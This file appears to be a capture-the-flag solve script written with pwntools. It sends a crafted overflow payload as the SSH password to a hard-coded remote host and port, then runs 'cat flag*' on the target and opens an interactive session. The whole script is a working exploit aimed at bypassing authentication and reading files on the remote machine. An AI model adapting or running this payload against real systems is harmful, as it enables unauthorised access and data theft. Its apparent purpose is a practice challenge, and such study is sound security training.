from pwn import *
from icecream import ic

payload = b'a'.ljust(100, b'a')
payload += p32(0xADC29EC3)
payload += p32(0xAFC3BEC2)
payload += b"\x00"



io = ssh(host = "35.234.82.46", port = 31849, user = "sshuser", password=payload)
context.log_level = 'debug'

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

sl("cat flag*")

io.interactive()